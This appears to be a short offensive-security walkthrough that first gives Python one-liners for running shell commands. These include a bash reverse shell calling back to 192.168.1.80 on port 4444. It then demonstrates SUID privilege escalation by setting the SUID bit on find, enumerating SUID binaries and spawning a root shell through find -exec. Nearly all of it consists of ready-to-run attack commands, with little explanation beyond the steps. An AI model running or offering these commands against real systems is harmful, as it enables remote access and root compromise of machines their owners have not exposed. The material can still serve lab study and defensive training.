Launch the following codes on the console to get a reverse shell
__import__('os').popen('whoami').read();
import os; print(os.popen("whoami").read())

# Reverse shell
__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.80/4444 0>&1"').read()

Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation. Next we run the following command on the Find command:
chmod u+s /usr/bin/find
This enables SUID permission on Find so that we as the attacker can exploit and launch Find as root user. As we now have access to victimâ€™s machine, we will use Find command to identify binaries having SUID permission:
find / -perm -u=s -type f 2>/dev/null
The binary that we are interested in is the /usr/bin/find. We can now execute commands on Find using the -exec parameter to launch a privileged and interactive bash shell.
find /usr/bin/ -name find -exec /bin/bash -ip \;
With this, simply run id and it will show that the uid is the user whereas the euid is root, we can now run privileged commands with the shell.
